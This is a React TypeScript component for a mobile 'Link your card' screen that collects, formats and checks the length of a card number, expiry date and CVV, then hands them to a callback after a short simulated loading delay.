"use client";

import { useState } from "react";
import { CreditCard, Calendar, Lock } from "lucide-react";

interface CardDetailsScreenProps {
    onNext: (cardNumber: string, expiry: string, cvv: string) => void;
    onBack: () => void;
}

export function CardDetailsScreen({ onNext, onBack }: CardDetailsScreenProps) {
    const [cardNumber, setCardNumber] = useState("");
    const [expiry, setExpiry] = useState("");
    const [cvv, setCvv] = useState("");
    const [error, setError] = useState("");
    const [isLoading, setIsLoading] = useState(false);

    const formatCardNumber = (value: string) => {
        const cleaned = value.replace(/\D/g, "").slice(0, 16);
        return cleaned.replace(/(.{4})/g, "$1 ").trim();
    };

    const formatExpiry = (value: string) => {
        const cleaned = value.replace(/\D/g, "").slice(0, 4);
        if (cleaned.length >= 3) {
            return cleaned.slice(0, 2) + "/" + cleaned.slice(2);
        }
        return cleaned;
    };

    const handleCardChange = (e: React.ChangeEvent<HTMLInputElement>) => {
        const raw = e.target.value.replace(/\D/g, "").slice(0, 16);
        setCardNumber(raw);
        setError("");
    };

    const handleExpiryChange = (e: React.ChangeEvent<HTMLInputElement>) => {
        const raw = e.target.value.replace(/\D/g, "").slice(0, 4);
        setExpiry(raw);
        setError("");
    };

    const handleCvvChange = (e: React.ChangeEvent<HTMLInputElement>) => {
        const raw = e.target.value.replace(/\D/g, "").slice(0, 3);
        setCvv(raw);
        setError("");
    };

    const handleNext = () => {
        if (cardNumber.length < 16) {
            setError("Please enter a valid 16-digit card number");
            return;
        }
        if (expiry.length < 4) {
            setError("Please enter a valid expiry date (MM/YY)");
            return;
        }
        if (cvv.length < 3) {
            setError("Please enter a valid 3-digit CVV");
            return;
        }
        setIsLoading(true);
        setTimeout(() => {
            setIsLoading(false);
            onNext(cardNumber, expiry, cvv);
        }, 1500);
    };

    const isFilled = cardNumber.length === 16 && expiry.length === 4 && cvv.length === 3;

    return (
        <div className="h-[100dvh] max-h-[100dvh] bg-white flex flex-col font-sans overflow-hidden">
            {/* Blue Header */}
            <div className="bg-[#007DFE] h-[56px] min-h-[56px] flex items-center px-4 relative">
                <button
                    onClick={onBack}
                    className="p-2 -ml-2 hover:bg-white/10 rounded-full transition-colors"
                >
                    <svg className="w-6 h-6 text-white" fill="none" stroke="currentColor" strokeWidth={2.5} viewBox="0 0 24 24">
                        <path strokeLinecap="round" strokeLinejoin="round" d="M15 19l-7-7 7-7" />
                    </svg>
                </button>
                <h1 className="absolute left-1/2 -translate-x-1/2 text-white text-[18px] font-semibold">
                    Card Details
                </h1>
            </div>

            {/* Main Content */}
            <div className="flex-1 flex flex-col px-6 pt-7 pb-6">
                <h2 className="text-[#002147] text-[20px] font-bold mb-1">
                    Link your card
                </h2>
                <p className="text-[#4A5568] text-[13px] mb-6">
                    Enter your card details to continue.
                </p>

                {/* Card Number */}
                <div className="mb-5">
                    <label className="text-[#002147] text-[12px] font-semibold mb-2 block uppercase tracking-wide">
                        Card Number
                    </label>
                    <div className="flex items-center border-b-2 border-gray-200 focus-within:border-[#007DFE] pb-2 transition-colors gap-3">
                        <CreditCard className="w-5 h-5 text-gray-400 flex-shrink-0" />
                        <input
                            type="tel"
                            value={formatCardNumber(cardNumber)}
                            onChange={handleCardChange}
                            placeholder="0000 0000 0000 0000"
                            className="flex-1 bg-transparent text-[#002147] text-[17px] font-bold placeholder:text-gray-300 focus:outline-none tracking-widest"
                        />
                    </div>
                </div>

                {/* Expiry + CVV */}
                <div className="flex gap-6 mb-5">
                    <div className="flex-1">
                        <label className="text-[#002147] text-[12px] font-semibold mb-2 block uppercase tracking-wide">
                            Expiry
                        </label>
                        <div className="flex items-center border-b-2 border-gray-200 focus-within:border-[#007DFE] pb-2 transition-colors gap-3">
                            <Calendar className="w-5 h-5 text-gray-400 flex-shrink-0" />
                            <input
                                type="tel"
                                value={formatExpiry(expiry)}
                                onChange={handleExpiryChange}
                                placeholder="MM/YY"
                                className="flex-1 bg-transparent text-[#002147] text-[17px] font-bold placeholder:text-gray-300 focus:outline-none tracking-wider"
                            />
                        </div>
                    </div>
                    <div className="flex-1">
                        <label className="text-[#002147] text-[12px] font-semibold mb-2 block uppercase tracking-wide">
                            CVV
                        </label>
                        <div className="flex items-center border-b-2 border-gray-200 focus-within:border-[#007DFE] pb-2 transition-colors gap-3">
                            <Lock className="w-5 h-5 text-gray-400 flex-shrink-0" />
                            <input
                                type="tel"
                                value={cvv}
                                onChange={handleCvvChange}
                                placeholder="•••"
                                className="flex-1 bg-transparent text-[#002147] text-[17px] font-bold placeholder:text-gray-300 focus:outline-none tracking-widest"
                            />
                        </div>
                    </div>
                </div>

                {/* Error */}
                {error && (
                    <p className="text-red-500 text-sm mb-3">{error}</p>
                )}

                {/* Spacer */}
                <div className="flex-1" />

                {/* Next Button */}
                <button
                    onClick={handleNext}
                    disabled={isLoading}
                    className={`w-full py-[16px] rounded-full font-bold text-[18px] transition-all flex items-center justify-center shadow-md ${isFilled
                        ? "bg-[#007DFE] text-white hover:opacity-90"
                        : "bg-[#9EC7F6] text-[#0066CC]"
                        } disabled:opacity-70`}
                >
                    {isLoading ? (
                        <div className="w-6 h-6 border-3 border-white/30 border-t-white rounded-full animate-spin" />
                    ) : (
                        "Next"
                    )}
                </button>
            </div>
        </div>
    );
}
